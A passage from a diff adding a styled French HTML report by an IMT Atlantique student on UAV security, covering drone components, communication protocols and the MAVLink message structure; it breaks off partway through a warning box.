@@ -1,0 +1,2247 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sécurité des Environnements IoV & UAV — Yakine Haffoudhi</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --teal-dark: #0d4f4f;
+    --teal-mid: #0e7b7b;
+    --teal: #12a8a8;
+    --teal-light: #4fd1d1;
+    --accent: #f0c040;
+    --red: #e05555;
+    --bg: #040d0d;
+    --bg2: #081515;
+    --bg3: #0a1e1e;
+    --card: #0c2222;
+    --card2: #0f2a2a;
+    --border: rgba(18,168,168,0.25);
+    --text: #c8e8e8;
+    --text-dim: #6aadad;
+    --text-bright: #e8f8f8;
+    --mono: 'JetBrains Mono', monospace;
+    --display: 'Syne', sans-serif;
+    --body: 'Space Mono', monospace;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 13px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* ── SCAN LINES OVERLAY ── */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.08) 2px, rgba(0,0,0,0.08) 4px);
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ── HERO ── */
+  .hero {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+    background: radial-gradient(ellipse 80% 60% at 50% 40%, #0e4040 0%, #040d0d 70%);
+    padding: 60px 40px;
+    text-align: center;
+  }
+
+  .hero-grid {
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(18,168,168,0.07) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(18,168,168,0.07) 1px, transparent 1px);
+    background-size: 60px 60px;
+    animation: gridScroll 20s linear infinite;
+  }
+
+  .img {
+    display: block;              
+    margin: 20px auto;      
+    width: 70%;                 
+    max-height: 500px;
+    object-fit: cover;
+    border-radius: 12px;
+
+    border: 3px solid #0d4f4f;   
+    box-shadow: 0 0 15px #00FFFF50; 
+  }
+
+  @keyframes gridScroll {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(60px); }
+  }
+
+  .hero-badge {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--teal);
+    border: 1px solid var(--border);
+    padding: 6px 18px;
+    border-radius: 2px;
+    margin-bottom: 28px;
+    position: relative;
+    z-index: 1;
+    background: rgba(12,34,34,0.6);
+    animation: fadeUp 0.8s ease both;
+  }
+
+  .hero h1 {
+    font-family: var(--display);
+    font-size: clamp(38px, 7vw, 88px);
+    font-weight: 800;
+    color: var(--text-bright);
+    letter-spacing: -2px;
+    line-height: 1.05;
+    position: relative;
+    z-index: 1;
+    animation: fadeUp 0.9s ease both 0.1s;
+    text-shadow: 0 0 80px rgba(18,168,168,0.4);
+  }
+
+  .hero h1 span {
+    color: var(--teal);
+    display: block;
+  }
+
+  .hero-sub {
+    font-family: var(--display);
+    font-size: 15px;
+    color: var(--text-dim);
+    margin: 24px 0 40px;
+    position: relative;
+    z-index: 1;
+    animation: fadeUp 1s ease both 0.2s;
+    letter-spacing: 1px;
+  }
+
+  .hero-meta {
+    display: flex;
+    gap: 40px;
+    justify-content: center;
+    position: relative;
+    z-index: 1;
+    animation: fadeUp 1s ease both 0.3s;
+    flex-wrap: wrap;
+  }
+
+  .hero-meta-item {
+    text-align: center;
+  }
+
+  .hero-meta-item .label {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 2px;
+    color: var(--teal-mid);
+    text-transform: uppercase;
+  }
+
+  .hero-meta-item .value {
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-bright);
+    margin-top: 4px;
+  }
+
+  .imt-logo-placeholder {
+    position: absolute;
+    top: 30px;
+    right: 40px;
+    font-family: var(--display);
+    font-size: 11px;
+    font-weight: 800;
+    color: var(--teal);
+    letter-spacing: 2px;
+    z-index: 2;
+  }
+
+  .nav-tabs {
+    display: flex;
+    gap: 0;
+    position: relative;
+    z-index: 1;
+    margin-top: 48px;
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    overflow: hidden;
+    animation: fadeUp 1s ease both 0.4s;
+  }
+
+  .nav-tab {
+    padding: 12px 32px;
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    cursor: pointer;
+    background: rgba(12,34,34,0.7);
+    color: var(--text-dim);
+    border: none;
+    transition: all 0.3s;
+    border-right: 1px solid var(--border);
+  }
+
+  .nav-tab:last-child { border-right: none; }
+
+  .nav-tab.active, .nav-tab:hover {
+    background: var(--teal-dark);
+    color: var(--teal-light);
+  }
+
+  /* ── SECTIONS ── */
+  .section {
+    display: none;
+    animation: fadeIn 0.4s ease;
+  }
+
+  .section.active { display: block; }
+
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+  /* ── CONTAINERS ── */
+  .container { max-width: 1200px; margin: 0 auto; padding: 0 40px; }
+
+  /* ── SECTION HEADER ── */
+  .section-header {
+    padding: 80px 40px 40px;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+
+  .section-eyebrow {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--teal);
+    text-transform: uppercase;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .section-eyebrow::before {
+    content: '';
+    display: block;
+    width: 40px;
+    height: 1px;
+    background: var(--teal);
+  }
+
+  .section-title {
+    font-family: var(--display);
+    font-size: clamp(28px, 4vw, 52px);
+    font-weight: 800;
+    color: var(--text-bright);
+    line-height: 1.1;
+    letter-spacing: -1px;
+  }
+
+  /* ── PART DIVIDER ── */
+  .part-banner {
+    background: var(--teal-dark);
+    border-top: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+    padding: 20px 40px;
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    margin: 60px 0 0;
+  }
+
+  .part-banner .part-num {
+    font-family: var(--display);
+    font-size: 48px;
+    font-weight: 800;
+    color: var(--teal);
+    opacity: 0.3;
+    line-height: 1;
+  }
+
+  .part-banner .part-info .part-label {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 3px;
+    color: var(--teal-light);
+    text-transform: uppercase;
+  }
+
+  .part-banner .part-info .part-name {
+    font-family: var(--display);
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text-bright);
+  }
+
+  /* ── CARDS GRID ── */
+  .cards-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 1px;
+    background: var(--border);
+    margin: 0;
+  }
+
+  .card {
+    background: var(--card);
+    padding: 28px;
+    transition: background 0.2s;
+  }
+
+  .card:hover { background: var(--card2); }
+
+  .card-icon {
+    font-size: 20px;
+    margin-bottom: 14px;
+  }
+
+  .card-title {
+    font-family: var(--display);
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--teal-light);
+    margin-bottom: 10px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .card-body {
+    font-size: 12px;
+    color: var(--text);
+    line-height: 1.8;
+  }
+
+  /* ── TABLE ── */
+  .data-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+  }
+
+  .data-table th {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--teal);
+    background: var(--teal-dark);
+    padding: 12px 16px;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .data-table td {
+    padding: 12px 16px;
+    border-bottom: 1px solid rgba(18,168,168,0.1);
+    color: var(--text);
+    vertical-align: top;
+  }
+
+  .data-table tr:hover td { background: rgba(18,168,168,0.04); }
+
+  .data-table td:first-child {
+    font-family: var(--mono);
+    color: var(--teal-light);
+    white-space: nowrap;
+  }
+
+  /* ── CODE BLOCK ── */
+  .code-block {
+    background: #020a0a;
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--teal);
+    border-radius: 0 2px 2px 0;
+    padding: 20px 24px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--teal-light);
+    overflow-x: auto;
+    margin: 20px 0;
+    line-height: 1.9;
+  }
+
+  .code-block .comment { color: #3d7070; }
+  .code-block .keyword { color: var(--accent); }
+  .code-block .cmd { color: #a8d8a8; }
+
+  /* ── TERMINAL ── */
+  .terminal {
+    background: #000e0e;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+    margin: 24px 0;
+  }
+
+  .terminal-bar {
+    background: var(--teal-dark);
+    padding: 8px 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--teal-light);
+    letter-spacing: 1px;
+  }
+
+  .terminal-dot {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    display: inline-block;
+  }
+
+  .terminal-body {
+    padding: 20px 24px;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 2;
+  }
+
+  .t-prompt { color: var(--teal); }
+  .t-cmd { color: #b8e8b8; }
+  .t-out { color: #7aadad; }
+  .t-warn { color: var(--accent); }
+  .t-err { color: var(--red); }
+  .t-comment { color: #3d7070; }
+
+  /* ── ALERT BOX ── */
+  .alert {
+    border: 1px solid;
+    padding: 16px 20px;
+    margin: 20px 0;
+    font-size: 12px;
+    line-height: 1.7;
+    border-radius: 2px;
+  }
+
+  .alert-warn {
+    border-color: var(--accent);
+    background: rgba(240,192,64,0.06);
+    color: var(--accent);
+  }
+
+  .alert-danger {
+    border-color: var(--red);
+    background: rgba(224,85,85,0.06);
+    color: #f08080;
+  }
+
+  .alert-info {
+    border-color: var(--teal);
+    background: rgba(18,168,168,0.06);
+    color: var(--teal-light);
+  }
+
+  .alert strong {
+    font-family: var(--display);
+    font-size: 11px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    display: block;
+    margin-bottom: 6px;
+  }
+
+  /* ── VULNERABILITY CARD ── */
+  .vuln-card {
+    border: 1px solid rgba(224,85,85,0.3);
+    background: rgba(224,85,85,0.04);
+    padding: 24px;
+    margin: 16px 0;
+    border-radius: 2px;
+    border-left: 3px solid var(--red);
+  }
+
+  .vuln-title {
+    font-family: var(--display);
+    font-size: 14px;
+    font-weight: 700;
+    color: #f08080;
+    margin-bottom: 10px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  /* ── MAVLINK PACKET VIZ ── */
+  .packet-viz {
+    display: flex;
+    gap: 2px;
+    margin: 24px 0;
+    overflow-x: auto;
+    padding-bottom: 8px;
+  }
+
+  .packet-field {
+    background: var(--card);
+    border: 1px solid var(--border);
+    padding: 8px 12px;
+    text-align: center;
+    flex-shrink: 0;
+  }
+
+  .packet-field .fname {
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--teal);
+    letter-spacing: 1px;
+    margin-bottom: 4px;
+  }
+
+  .packet-field .fval {
+    font-family: var(--display);
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--text-bright);
+  }
+
+  .packet-field.highlight { background: var(--teal-dark); border-color: var(--teal); }
+  .packet-field.danger { background: rgba(224,85,85,0.1); border-color: var(--red); }
+
+  /* ── HEARTBEAT VIZ ── */
+  .heartbeat-row {
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 8px 14px;
+    border-bottom: 1px solid rgba(18,168,168,0.08);
+    line-height: 1.6;
+  }
+
+  .heartbeat-row .dir { color: var(--teal-mid); margin-right: 6px; }
+  .heartbeat-row .key { color: var(--teal); }
+  .heartbeat-row .val { color: var(--accent); }
+  .heartbeat-row .annotation { color: var(--text-dim); font-size: 10px; margin-top: 2px; margin-left: 20px; display: block; }
+
+  /* ── PROTOCOL FLOW ── */
+  .flow-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 16px;
+    padding: 16px 20px;
+    border-bottom: 1px solid rgba(18,168,168,0.08);
+  }
+
+  .flow-num {
+    font-family: var(--display);
+    font-size: 28px;
+    font-weight: 800;
+    color: var(--teal);
+    opacity: 0.3;
+    line-height: 1;
+    flex-shrink: 0;
+    width: 36px;
+    text-align: right;
+  }
+
+  .flow-content .flow-title {
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--teal-light);
+    margin-bottom: 4px;
+  }
+
+  .flow-content .flow-desc {
+    font-size: 12px;
+    color: var(--text);
+  }
+
+  /* ── SENSOR TABLE ── */
+  .sensor-badge {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 1px;
+    padding: 2px 7px;
+    border-radius: 2px;
+    border: 1px solid var(--teal);
+    color: var(--teal);
+    white-space: nowrap;
+  }
+
+  /* ── COMPARISON ── */
+  .compare-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1px;
+    background: var(--border);
+    margin: 20px 0;
+  }
+
+  @media (max-width: 700px) { .compare-grid { grid-template-columns: 1fr; } }
+
+  .compare-cell {
+    background: var(--card);
+    padding: 24px;
+  }
+
+  .compare-cell .c-label {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 14px;
+  }
+
+  .compare-cell.v1 .c-label { color: var(--red); }
+  .compare-cell.v2 .c-label { color: var(--teal-light); }
+
+  .compare-cell ul {
+    padding-left: 0;
+    list-style: none;
+  }
+
+  .compare-cell ul li {
+    font-size: 12px;
+    color: var(--text);
+    padding: 6px 0;
+    border-bottom: 1px solid rgba(18,168,168,0.08);
+    padding-left: 16px;
+    position: relative;
+  }
+
+  .compare-cell ul li::before {
+    content: '→';
+    position: absolute;
+    left: 0;
+    color: var(--teal-mid);
+  }
+
+  /* ── SIMULATION STEPS ── */
+  .step-card {
+    border: 1px solid var(--border);
+    background: var(--card);
+    margin-bottom: 1px;
+  }
+
+  .step-header {
+    padding: 16px 24px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    cursor: pointer;
+    user-select: none;
+    transition: background 0.2s;
+  }
+
+  .step-header:hover { background: var(--card2); }
+
+  .step-num {
+    font-family: var(--display);
+    font-size: 32px;
+    font-weight: 800;
+    color: var(--teal);
+    opacity: 0.25;
+    line-height: 1;
+    min-width: 40px;
+  }
+
+  .step-title {
+    font-family: var(--display);
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--text-bright);
+    flex: 1;
+  }
+
+  .step-tag {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 2px;
+    color: var(--teal);
+    border: 1px solid var(--border);
+    padding: 3px 8px;
+    border-radius: 2px;
+  }
+
+  .step-body {
+    padding: 0 24px 24px 80px;
+  }
+
+  /* ── MISSION FILE VIZ ── */
+  .mission-viz {
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+
+  .mission-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: var(--mono);
+    font-size: 11px;
+  }
+
+  .mission-table th {
+    background: #020a0a;
+    color: var(--teal);
+    font-size: 9px;
+    letter-spacing: 2px;
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--border);
+    text-align: center;
+  }
+
+  .mission-table td {
+    padding: 8px 12px;
+    border-bottom: 1px solid rgba(18,168,168,0.1);
+    text-align: center;
+    color: var(--text);
+  }
+
+  .mission-table tr:hover td { background: rgba(18,168,168,0.04); }
+
+  .wp-nav { color: var(--teal-light); }
+  .wp-land { color: var(--accent); }
+
+  /* ── USV / UUV SPECIFIC ── */
+  .vehicle-type-header {
+    background: linear-gradient(135deg, var(--teal-dark) 0%, var(--bg2) 100%);
+    border: 1px solid var(--border);
+    padding: 32px 40px;
+    margin: 40px 0 0;
+    display: grid;
+    grid-template-columns: 1fr auto;
+    align-items: center;
+    gap: 24px;
+  }
+
+  .vehicle-type-header .vt-title {
+    font-family: var(--display);
+    font-size: 28px;
+    font-weight: 800;
+    color: var(--text-bright);
+  }
+
+  .vehicle-type-header .vt-subtitle {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--teal-mid);
+    margin-top: 6px;
+  }
+
+  .vehicle-type-header .vt-badge {
+    font-family: var(--display);
+    font-size: 48px;
+    font-weight: 800;
+    color: var(--teal);
+    opacity: 0.15;
+  }
+
+  /* ── CONTENT AREA ── */
+  .content-area {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 40px 80px;
+  }
+
+  .prose {
+    font-size: 13px;
+    line-height: 1.9;
+    color: var(--text);
+    margin: 16px 0;
+  }
+
+  .prose strong { color: var(--teal-light); font-weight: 700; }
+
+  h3.subsection {
+    font-family: var(--display);
+    font-size: 18px;
+    font-weight: 700;
+    color: var(--text-bright);
+    margin: 36px 0 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+    letter-spacing: -0.5px;
+  }
+
+  h4.sub2 {
+    font-family: var(--display);
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--teal-light);
+    margin: 24px 0 10px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  ul.styled {
+    list-style: none;
+    padding: 0;
+  }
+
+  ul.styled li {
+    padding: 5px 0 5px 20px;
+    position: relative;
+    font-size: 12px;
+    color: var(--text);
+    line-height: 1.7;
+    border-bottom: 1px solid rgba(18,168,168,0.06);
+  }
+
+  ul.styled li::before {
+    content: '▸';
+    position: absolute;
+    left: 0;
+    color: var(--teal-mid);
+    font-size: 10px;
+  }
+
+  /* ── FOOTER ── */
+  footer {
+    background: var(--bg2);
+    border-top: 1px solid var(--border);
+    padding: 32px 40px;
+    text-align: center;
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--teal-mid);
+    letter-spacing: 1px;
+  }
+
+  /* ── RESPONSIVE ── */
+  @media (max-width: 768px) {
+    .section-header, .content-area { padding: 40px 20px; }
+    .part-banner { padding: 16px 20px; }
+    .hero { padding: 40px 20px; }
+    .cards-grid { grid-template-columns: 1fr; }
+    .imt-logo-placeholder { display: none; }
+  }
+
+  /* ── SCROLL TO TOP ── */
+  .scroll-top {
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    background: var(--teal-dark);
+    border: 1px solid var(--teal);
+    color: var(--teal-light);
+    width: 40px;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    font-size: 16px;
+    z-index: 1000;
+    transition: all 0.2s;
+    opacity: 0;
+    border-radius: 2px;
+  }
+
+  .scroll-top.visible { opacity: 1; }
+  .scroll-top:hover { background: var(--teal-mid); color: var(--bg); }
+
+  .tag-teal {
+    display: inline-block;
+    background: rgba(18,168,168,0.15);
+    border: 1px solid var(--teal);
+    color: var(--teal-light);
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 2px;
+    margin: 2px;
+  }
+
+  .tag-red {
+    display: inline-block;
+    background: rgba(224,85,85,0.1);
+    border: 1px solid var(--red);
+    color: #f08080;
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 2px;
+    margin: 2px;
+  }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 32px 0;
+  }
+
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 24px;
+    margin: 20px 0;
+  }
+
+  @media (max-width: 700px) { .two-col { grid-template-columns: 1fr; } }
+
+  .info-box {
+    border: 1px solid var(--border);
+    background: var(--card);
+    padding: 20px 24px;
+    border-radius: 2px;
+  }
+
+  .info-box .ib-title {
+    font-family: var(--display);
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--teal-light);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 12px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-grid"></div>
+  <div class="imt-logo-placeholder">IMT ATLANTIQUE</div>
+  <h1>Sécurité des <span>environnements UAV</span></h1>
+  <p class="hero-sub">Analyse · Attaques · Détection d'anomalies</p>
+  <div class="hero-meta">
+    <div class="hero-meta-item">
+      <div class="label">Préparé par</div>
+      <div class="value">Yakine Haffoudhi</div>
+    </div>
+    <div class="hero-meta-item">
+      <div class="label">Encadré par</div>
+      <div class="value">Mme. Samiha Ayed</div>
+    </div>
+    <div class="hero-meta-item">
+      <div class="label">Établissement</div>
+      <div class="value">IMT Atlantique</div>
+    </div>
+    <div class="hero-meta-item">
+      <div class="label">Protocole étudié</div>
+      <div class="value">MAVLink</div>
+    </div>
+  </div>
+  <div class="nav-tabs">
+    <button class="nav-tab active" onclick="showSection('theorie')">Partie Théorique</button>
+    <button class="nav-tab" onclick="showSection('simulation')">Simulation & Analyse</button>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════════
+     PARTIE THÉORIQUE
+═══════════════════════════════════════════════════════════ -->
+<div id="theorie" class="section active">
+
+  <!-- ── PARTIE 1 : UAV ── -->
+  <div class="part-banner">
+    <div class="part-num">01</div>
+    <div class="part-info">
+      <div class="part-label">Partie 1</div>
+      <div class="part-name">Véhicule Aérien Non Piloté — UAV</div>
+    </div>
+  </div>
+
+  <div class="content-area">
+
+    <h3 class="subsection">Composants des Drones</h3>
+    <div class="cards-grid">
+      <div class="card">
+        <div class="card-title">Contrôleur de Vol</div>
+        <div class="card-body">Cerveau du drone. Exécute les algorithmes de contrôle de vol, stabilise l'appareil, gère les capteurs embarqués (IMU, GPS, altimètre) et exécute les commandes reçues depuis la GCS.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">GPS</div>
+        <div class="card-body">Position & navigation. Fournit la latitude, longitude, altitude et vitesse. Sans GNSS, de nombreuses fonctions deviennent impossibles : maintien de position, retour automatique, navigation par waypoints.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">IMU</div>
+        <div class="card-body">Accéléromètre + gyroscope + magnétomètre. Mesure les mouvements et l'orientation. Essentiel pour la stabilisation en vol.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Module de Communication</div>
+        <div class="card-body">Liaison bidirectionnelle sol ↔ drone. Permet le transfert des commandes, de la télémétrie et des données mission. Sa sécurité est critique car toute compromission entraîne une perte de contrôle.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Capteurs</div>
+        <div class="card-body">Altitude, caméra, sonar, baromètre, capteurs de distance pour l'évitement d'obstacles.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Batterie</div>
+        <div class="card-body">Alimentation de l'ensemble des composants. L'état de la batterie est transmis en continu via MAVLink (SYS_STATUS).</div>
+      </div>
+    </div>
+
+    <h3 class="subsection">Méthodes de Contrôle</h3>
+    <div class="cards-grid">
+      <div class="card">
+        <div class="card-title">Contrôle Autonome</div>
+        <div class="card-body">Le drone prend toutes les décisions sans intervention humaine, en s'appuyant sur des algorithmes et des capteurs embarqués.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Contrôle Supervisé</div>
+        <div class="card-body">Le drone exécute sa mission de manière autonome, mais un opérateur peut intervenir à tout moment pour ajuster ou corriger le comportement.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Contrôle Piloté</div>
+        <div class="card-body">Toutes les décisions sont prises par un opérateur humain à distance, via la station de contrôle au sol (GCS).</div>
+      </div>
+    </div>
+
+    <h3 class="subsection">Types de communications</h3>
+    <div class="cards-grid" style="grid-template-columns: repeat(auto-fill, minmax(260px,1fr))">
+      <div class="card">
+        <div class="card-title">Drone-to-Ground Station</div>
+        <div class="card-body">Échange via Wi-Fi ou Bluetooth. Souvent peu sécurisé, vulnérable à l'interception et à la prise de contrôle.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Drone-to-Network</div>
+        <div class="card-body">Connexion aux réseaux cellulaires 4G/5G. Grande portée, mais nécessite une sécurisation renforcée contre les attaques réseau.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Drone-to-Satellite</div>
+        <div class="card-body">Utilisée par le GPS. Fiable mais coûteuse. Cible d'attaques de brouillage ou de spoofing GPS.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Drone-to-Drone</div>
+        <div class="card-body">Échange direct inter-drones. Utilisé dans les essaims. Non encore bien standardisé, exposé aux attaques pair-à-pair.</div>
+      </div>
+    </div>
+
+    <h3 class="subsection"> Architecture de communication</h3>
+    <div class="cards-grid" style="grid-template-columns: repeat(auto-fill, minmax(230px,1fr))">
+      <div class="card">
+        <div class="card-title">Contrôleur de Vol</div>
+        <div class="card-body">Autopilote (ArduPilot). Assure la stabilisation, le contrôle de trajectoire et l'exécution des missions autonomes.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Station de Contrôle GCS</div>
+        <div class="card-body">Suivi en temps réel, envoi de commandes, supervision des missions.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Systèmes de Communication</div>
+        <div class="card-body">Radio RF · Wi-Fi (zones côtières) · LTE/4G/5G · Satellite (missions longue distance)</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Capteurs</div>
+        <div class="card-body">GNSS · IMU · Sonar (détection sous-marine) · Caméras · Capteurs météorologiques. Fusion de capteurs cruciale en milieu maritime.</div>
+      </div>
+    </div>
+
+    <h3 class="subsection">Protocoles de Communication des Drones</h3>
+
+    <h4 class="sub2">1. Protocoles Radio</h4>
+    <div class="two-col">
+      <div class="info-box">
+        <div class="ib-title">PWM / PPM / SBUS</div>
+        <ul class="styled">
+          <li><strong>PWM</strong> : chaque canal transmis séparément → plus de fils, plus de latence</li>
+          <li><strong>PPM</strong> : regroupe plusieurs canaux dans un signal → réduit le câblage</li>
+          <li><strong>SBUS</strong> : numérique avancé, meilleure précision, latence réduite, robuste aux interférences</li>
+        </ul>
+      </div>
+      <div class="info-box">
+        <div class="ib-title">LoRa (Long Range)</div>
+        <ul class="styled">
+          <li>Longue portée, faible consommation énergétique</li>
+          <li>Idéal pour télémétrie longue distance, agriculture intelligente, surveillance</li>
+          <li>Non adapté au streaming vidéo (faible débit)</li>
+        </ul>
+      </div>
+    </div>
+
+    <h4 class="sub2">2. Protocoles Réseau (IP)</h4>
+    <div class="two-col">
+      <div class="info-box">
+        <div class="ib-title">TCP / UDP / HTTP</div>
+        <ul class="styled">
+          <li><strong>TCP</strong> : transmission fiable avec contrôle d'erreur, latence plus élevée</li>
+          <li><strong>UDP</strong> : rapide, faible latence, idéal pour la télémétrie temps réel et FPV</li>
+          <li><strong>HTTPS</strong> : gestion et serveurs cloud avec chiffrement TLS</li>
+          <li><strong>WebSocket</strong> : communication bidirectionnelle temps réel pour tableaux de bord</li>
+        </ul>
+      </div>
+      <div class="info-box">
+        <div class="ib-title">Protocoles Satellite</div>
+        <ul class="styled">
+          <li><strong>Iridium</strong> : couverture mondiale, zones isolées, débit faible</li>
+          <li><strong>Inmarsat/BGAN</strong> : missions longues, surveillance</li>
+          <li><strong>Starlink (LEO)</strong> : débit élevé, latence faible, très prometteur</li>
+          <li><strong>GPS/GLONASS/Galileo</strong> : navigation par satellite indispensable</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3 class="subsection">Le Protocole MAVLink</h3>
+    <div class="prose">
+      MAVLink (<strong>Micro Air Vehicle Link</strong>) est un protocole de messagerie léger, conçu pour les systèmes embarqués avec peu de ressources et pour les liaisons radio à bande passante limitée. C'est l'un des protocoles les plus importants dans l'écosystème des drones, notamment sur les plateformes <strong>PX4 et ArduPilot</strong>.
+    </div>
+
+    <div class="two-col">
+      <div class="info-box">
+        <div class="ib-title">MAVLink transmet</div>
+        <ul class="styled">
+          <li>Télémétrie : altitude, vitesse, batterie, GPS, attitude</li>
+          <li>Ordres de commande (mode, armement…)</li>
+          <li>Missions (plans de vol, waypoints)</li>
+          <li>Paramètres de configuration</li>
+          <li>Communication avec composants externes (caméra, ordinateur embarqué)</li>
+        </ul>
+      </div>
+      <div class="info-box">
+        <div class="ib-title">Approche hybride</div>
+        <ul class="styled">
+          <li><strong>Diffusion (publish/subscribe)</strong> : flux continus comme la télémétrie</li>
+          <li><strong>Point-à-point</strong> : échanges critiques (missions, paramètres)</li>
+          <li>Deux types de messages : Command&Control (GCS→drone) et Telemetry/Status (drone→GCS)</li>
+        </ul>
+      </div>
+    </div>
+
+    <h4 class="sub2">Structure d'un Message MAVLink</h4>
+    <div class="packet-viz">
+      <div class="packet-field highlight">
+        <div class="fname">STX</div>
+        <div class="fval">0xFE</div>
+      </div>
+      <div class="packet-field">
+        <div class="fname">LEN</div>
+        <div class="fval">Longueur</div>
+      </div>
+      <div class="packet-field">
+        <div class="fname">SEQ</div>
+        <div class="fval">Séquence</div>
+      </div>
+      <div class="packet-field">
+        <div class="fname">SYS</div>
+        <div class="fval">System ID</div>
+      </div>
+      <div class="packet-field">
+        <div class="fname">COMP</div>
+        <div class="fval">Comp ID</div>
+      </div>
+      <div class="packet-field">
+        <div class="fname">MSG</div>
+        <div class="fval">Message ID</div>
+      </div>
+      <div class="packet-field" style="min-width:140px">
+        <div class="fname">PAYLOAD</div>
+        <div class="fval">Données GPS…</div>
+      </div>
+      <div class="packet-field danger">
+        <div class="fname">CKA/CKB</div>
+        <div class="fval">Checksum</div>
+      </div>
+    </div>
+    <div class="alert alert-warn">
+      <strong>⚠ Attention</strong>
